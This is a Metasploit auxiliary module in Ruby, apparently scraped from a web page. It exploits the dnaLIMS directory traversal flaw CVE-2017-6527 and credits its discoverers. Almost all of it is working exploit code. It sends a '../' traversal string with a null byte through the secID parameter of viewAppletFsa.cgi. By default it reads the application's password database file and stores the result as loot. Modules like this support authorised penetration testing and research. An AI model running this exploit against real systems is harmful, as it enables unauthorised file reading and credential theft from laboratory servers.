# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DnaLIMS Directory Traversal&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a directory traversal vulnerability found in dnaLIMS.
        Due to the way the viewAppletFsa.cgi script handles the &#039;secID&#039; parameter, it is possible
        to read a file outside the www directory.
      },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-6527&#039;],
          [&#039;US-CERT-VU&#039;, &#039;929263&#039;],
          [&#039;URL&#039;, &#039;https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/&#039;]
        ],
      &#039;Author&#039;         =>
        [
          &#039;h00die <mike@shorebreaksecurity.com>&#039;,    # Discovery, PoC
          &#039;flakey_biscuit <nicholas@shorebreaksecurity.com>&#039;  # Discovery, PoC
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => "Mar 8 2017"
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to dnaLIMS&#039;, &#039;/cgi-bin/dna/&#039;]),
        OptString.new(&#039;FILE&#039;, [ true,  "The path to the file to view", &#039;/home/dna/spool/.pfile&#039;]), # password db for app
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;The traversal depth&#039;, 4])
      ], self.class)

    deregister_options(&#039;RHOST&#039;)
  end


  def run_host(ip)
    file     = (datastore[&#039;FILE&#039;][0,1] == &#039;/&#039;) ? datastore[&#039;FILE&#039;] : "#{datastore[&#039;FILE&#039;]}"
    traverse = "../" * datastore[&#039;DEPTH&#039;]
    uri      = normalize_uri(target_uri.path)
    base     = File.dirname("#{uri}/.")

    print_status("Requesting: #{file} - #{rhost}")
    res = send_request_cgi({
      &#039;uri&#039;      => "#{base}/viewAppletFsa.cgi",
      &#039;vars_get&#039; => { &#039;secID&#039; => "#{traverse}#{file}%00",
                     &#039;Action&#039; => &#039;blast&#039;,
                    &#039;hidenav&#039; => &#039;1&#039;
      }
    })

    if not res
      print_error("No response from server.")
      return
    end

    if res.code != 200
      print_error("Server returned a non-200 response (body will not be saved):")
      print_line(res.to_s)
      return
    end

    vprint_good(res.body)
    p = store_loot(&#039;dnaLIMS.traversal.file&#039;, &#039;application/octet-stream&#039;, ip, res.body, File.basename(file))
    print_good("File saved as: #{p}")
  end

end


